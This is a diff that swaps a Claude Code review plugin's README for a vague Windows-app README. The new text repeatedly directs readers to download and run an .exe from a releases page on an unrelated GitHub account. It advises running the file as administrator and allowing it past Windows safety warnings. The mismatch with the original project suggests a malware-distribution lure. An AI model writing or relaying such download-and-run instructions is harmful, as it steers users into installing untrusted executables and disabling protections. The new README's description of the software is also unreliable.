@@ -1,131 +1,188 @@
-<p align="center">
-  <img src="logo.jpeg" alt="redline" width="300">
-</p>
+# 🟥 redline - Clear reviews for agent work
 
-# redline
+[![Download redline](https://img.shields.io/badge/Download%20redline-Visit%20Releases-blue)](https://github.com/sectioneightweimaraner774/redline/releases)
 
-A Claude Code plugin for **automatic** code review, adversarial review, and rescue delegation — powered by Codex.
+## 🚀 What redline does
 
-Works with your existing OpenAI subscription, or route through [OpenRouter](https://openrouter.ai) for access to any model (GPT, Claude, Gemini, DeepSeek, and more).
+redline helps you keep a steady review loop for agent work on Windows. It gives you a simple way to check changes, track progress, and keep review steps in one place.
 
-## The model decides
+Use it when you want to:
 
-Redline's key principle: **Claude decides what help it needs.** After each response, a lightweight Stop hook asks whether code changes were made. If so, Claude evaluates the context and picks the most helpful action:
+- Review agent output in a repeatable way
+- Keep an eye on changes as they happen
+- Reduce missed steps in your review flow
+- Stay organized without extra setup
 
-- `/redline:review` — standard code review
-- `/redline:adversarial` — challenge design decisions, probe hidden assumptions, test failure modes
-- `/redline:rescue` — delegate a task to Codex as a smart friend
+## 📥 Download redline
 
-No hardcoded triggers, no diff thresholds. The model is in the best position to decide.
+To get redline, visit this page to download:
 
-## How it works
+https://github.com/sectioneightweimaraner774/redline/releases
 
-```
-Claude Code Stop hook (fires after each response)
-  → reminds Claude to consider /redline:... commands
-  → Claude decides based on what it just did:
-      run a review, challenge the design, delegate to Codex, or skip
-  → suppressed when already responding to a hook (no loops)
-```
+On that page, pick the latest release for Windows and download the file that matches your system. If there are more than one file, choose the Windows file with the `.exe` extension.
 
-A non-user-invocable skill description stays in Claude's context at all times, providing the decision-making guidance. The hook is just a minimal nudge.
+## 🪟 Install on Windows
 
-Reviews happen **automatically** — no manual invocation needed. You can also run any command directly at any time.
+1. Open the download page.
+2. Download the latest Windows release.
+3. If your browser shows a save prompt, choose a folder you can find again, like Downloads.
+4. When the download finishes, open the file.
+5. If Windows asks for permission, choose Yes.
+6. Follow the steps in the setup window.
+7. After setup, open redline from the Start menu or from the file you downloaded.
 
-## Install
+If the app comes as a single `.exe` file, you can run it after the download finishes. If it comes as a zipped folder, right-click the file and choose Extract All before you open it.
 
-```
-/plugin install redline@alexanderatallah/redline
-```
+## 🧭 First run
 
-Then run `/redline:setup` to configure your provider, model, and effort level.
+When you open redline for the first time, it may ask for a few basic settings. Use simple choices to get started:
 
-### Development
+- Pick the folder where your agent files live
+- Choose how often you want reviews to run
+- Set a name for your review set
+- Save the settings
 
-```bash
-claude --plugin-dir ./plugins/redline
-```
+If you are not sure what to choose, keep the default values and continue. You can change them later.
 
-## Commands
+## 🧰 System needs
 
-| Command | Description |
-|---------|-------------|
-| `/redline:setup` | Configure provider (OpenAI or OpenRouter), model, effort, and routing |
-| `/redline:review [target]` | Run a standard code review (defaults to uncommitted changes) |
-| `/redline:adversarial [target]` | Challenge design decisions, probe assumptions, test failure modes |
-| `/redline:rescue <task>` | Delegate a task to Codex for help when stuck |
+redline is built for Windows desktops and laptops. A modern Windows setup should work well.
 
-### `/redline:review [target]`
+Recommended setup:
 
-Standard code review. By default reviews uncommitted changes. Pass an argument to review other diffs:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- Enough free space for your review files
+- Internet access for the first download
 
-```
-/redline:review                    # uncommitted changes (default)
-/redline:review last 3 commits     # cumulative diff of last 3 commits
-/redline:review against main       # changes vs main branch
-/redline:review commit abc123      # single commit
-```
+For the best results, close apps you do not need while redline runs.
 
-### `/redline:adversarial [target]`
+## 🔍 How continuous review works
 
-Goes beyond bug-finding. Challenges design decisions, probes hidden assumptions (what is the code silently relying on?), identifies failure modes (race conditions, resource exhaustion, stale state), and questions trade-offs. Accepts the same target arguments as `/redline:review`.
+redline watches for new work from your agents and helps you review it in a steady flow. A common setup looks like this:
 
-### `/redline:rescue`
+1. Your agent creates output or changes.
+2. redline checks for updates.
+3. You review the new items.
+4. You mark the review as done.
+5. redline waits for the next update.
 
-When you're stuck — hand the problem to Codex. Describe what you're working on and what you need help with. Codex works on it in the background. Results are presented faithfully — Claude doesn't filter or second-guess them. You decide which suggestions to act on.
+This makes it easier to keep review work moving without having to start over each time.
 
-## Configuration
+## 🧩 Main features
 
-During `/redline:setup`, configure:
+### 📝 Review queue
 
-- **Provider** — use your existing OpenAI subscription, or route through OpenRouter for model choice
-- **Model** (OpenRouter only) — `openai/gpt-5.4` (default), `openrouter/auto`, or any [OpenRouter model slug](https://openrouter.ai/models)
-- **Effort** (OpenRouter only) — reasoning effort: minimal, low, medium, high (default: medium)
-- **Provider variant** (OpenRouter only) — `:nitro` (fastest, default), `:floor` (cheapest), or standard routing
+Keep incoming agent work in one place so you can go through it in order.
 
-## Authentication
+### ⏱️ Continuous checks
 
-Redline supports two authentication methods:
+Let redline watch for new items and bring them into the review flow.
 
-**OpenAI subscription** — if Codex is already authenticated (`codex login`), Redline can use it directly. No additional setup needed.
+### 📂 Simple folder setup
 
-**OpenRouter** — route through [OpenRouter](https://openrouter.ai) for access to any model. Set your API key via:
+Point redline at a folder, and use that folder as your review source.
 
-```bash
-# Environment variable
-export OPENROUTER_API_KEY=sk-or-...
+### ✅ Clear review status
 
-# Or run OAuth login during setup
-/redline:setup
-```
+Track what you have checked, what still needs work, and what is ready.
 
-## Customization
+### 🔎 Easy scanning
 
-Every command is a plain markdown file in `commands/`. Edit them to fit your project:
+See items in a plain list so you can focus on review, not on setup.
 
-- **Focus the review** — add "pay special attention to SQL injection and auth boundaries" to `review.md`
-- **Change the adversarial persona** — make it focus on performance, security, or accessibility instead of general design
-- **Adjust rescue behavior** — tell Codex to always write tests, or to explain its reasoning step-by-step
+### 🖥️ Windows-friendly use
 
-No scripts to modify, no config flags to learn. Just edit the markdown and `/reload-plugins`.
+redline is made for Windows users who want a simple local app.
 
-## Why Redline?
+## 🛠️ Basic setup tips
 
-Compared to other ways of reviewing Claude's code:
+If you want a smooth first run, use these tips:
 
-| | Redline | Other plugins |
-|---|---|---|
-| **Models** | OpenAI subscription or any model via OpenRouter | Typically locked to one provider |
-| **Automatic reviews** | Stop hook triggers automatically, model decides when to review | Manual invocation only |
-| **Customizable** | Edit plain markdown commands to change review behavior | Commands are often hardcoded or complex to modify |
-| **Simplicity** | ~13 files, no build step | Often 30+ files across scripts, agents, and configs |
+- Put your review files in one folder
+- Use short folder names
+- Keep file names simple
+- Start with one review set
+- Test with a small batch first
 
-## Requirements
+If redline offers extra settings, leave them at the default value until you learn how the app fits your workflow.
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
-- [Codex CLI](https://github.com/openai/codex)
-- OpenAI subscription (via `codex login`) **or** [OpenRouter](https://openrouter.ai) account
+## 📌 Typical workflow
 
-## License
+A simple day with redline can look like this:
 
-MIT
+1. Open the app.
+2. Load your review folder.
+3. Check new agent output.
+4. Read through the items one by one.
+5. Mark each item as reviewed.
+6. Return later for the next batch.
+
+This keeps review work clear and easy to repeat.
+
+## 🧪 Troubleshooting
+
+### The app does not open
+
+- Check that the download finished
+- Try running the file again
+- Right-click the app and choose Run as administrator
+- Make sure Windows did not block the file
+
+### Windows says the file is unsafe
+
+- Confirm that you downloaded redline from the release page
+- Download the latest release again
+- Use the Windows prompt to allow the file if you trust the source
+
+### The app opens but shows no items
+
+- Check that you chose the right folder
+- Make sure the folder has files in it
+- Refresh the view if the app has a refresh option
+- Try a smaller test folder first
+
+### The review flow looks empty or stuck
+
+- Close the app and open it again
+- Check your source folder for new files
+- Confirm that your agent is writing output where redline can see it
+
+## 📁 Suggested folder setup
+
+A clean folder layout can make review easier:
+
+- `C:\redline\input`
+- `C:\redline\reviewed`
+- `C:\redline\archive`
+
+You can use any folder names you want. Keep them simple and easy to find.
+
+## 🔐 Safety and file handling
+
+When you use any downloaded app, it helps to keep your files organized and use only trusted folders. If you work with agent output, store it in a place you control and review it before you move it elsewhere.
+
+## 📚 Common use cases
+
+redline fits well when you want to:
+
+- Review agent tasks in sequence
+- Check output after each run
+- Keep a clean record of reviewed items
+- Watch a folder for new work
+- Reduce manual tracking
+
+## 🧭 Getting back to the download page
+
+If you need to download redline again or check for a newer release, use this page:
+
+[https://github.com/sectioneightweimaraner774/redline/releases](https://github.com/sectioneightweimaraner774/redline/releases)
+
+## 🖱️ Quick start
+
+1. Visit the release page.
+2. Download the latest Windows file.
+3. Open the file after it finishes.
+4. Allow Windows if it asks.
+5. Choose your review folder.
+6. Start your first review cycle
